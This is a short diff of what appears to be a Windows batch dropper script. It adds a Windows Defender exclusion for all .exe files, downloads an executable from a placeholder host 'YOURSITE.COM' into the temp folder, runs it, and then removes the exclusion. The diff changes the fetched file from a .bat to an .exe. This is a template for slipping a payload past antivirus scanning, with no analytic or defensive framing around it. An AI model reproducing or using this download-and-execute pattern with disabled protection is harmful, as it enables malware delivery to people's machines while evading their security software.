@@ -28,6 +28,6 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
-mod.exe
+Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
+installer.exe
 Powershell -Command "Remove-MpPreference -ExclusionExtension exe"
